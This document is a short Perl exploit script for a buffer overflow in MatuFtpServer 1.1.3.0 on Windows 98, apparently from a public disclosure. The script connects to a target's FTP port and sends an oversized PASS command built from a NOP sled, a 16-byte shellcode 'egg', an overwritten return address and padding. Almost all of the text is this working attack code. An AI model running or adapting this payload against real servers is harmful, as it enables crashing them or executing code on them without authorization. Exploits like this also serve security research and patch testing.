#!/usr/local/bin/perl

#-----------------------------------------------
# MatuFtpServer 1.1.3.0 exploit ( for Windows98 )
# written by Kanatoko <anvil@jumperz.net>
# http://www.jumperz.net/
#-----------------------------------------------

use Socket;

$connect_host = "target.example.com";
$port = 21;
$iaddr = inet_aton( $connect_host ) || die "Host Resolve Error.\n";
$sock_addr = pack_sockaddr_in( $port, $iaddr );
socket( SOCKET, PF_INET, SOCK_STREAM, 0 ) || die "Socket Error.\n";
connect( SOCKET, $sock_addr ) || die "Connect Error\n";
select( SOCKET ); $|=1; select( STDOUT );

    #egg written by UNYUN (http://www.shadowpenguin.org/)
    #16bytes
$egg  = "\x43\x43\x43\x43\x43\x53\x53\x53";
$egg .= "\xB8\x2D\x23\xF5\xBF\x48\x50\xC3";

    #0x0177F984
$buf  = "\x90" x 1032;
$buf .= $egg;
$buf .= "\x8C\xF9\x77\x01";
$buf .= "A" x 696;

print SOCKET "PASS $buf\r\n";
$hoge = <SOCKET>; print $hoge;

--

#sorry for the bad english

Kanatoko <anvil@jumperz.net>
http://www.jumperz.net/(Japanese)
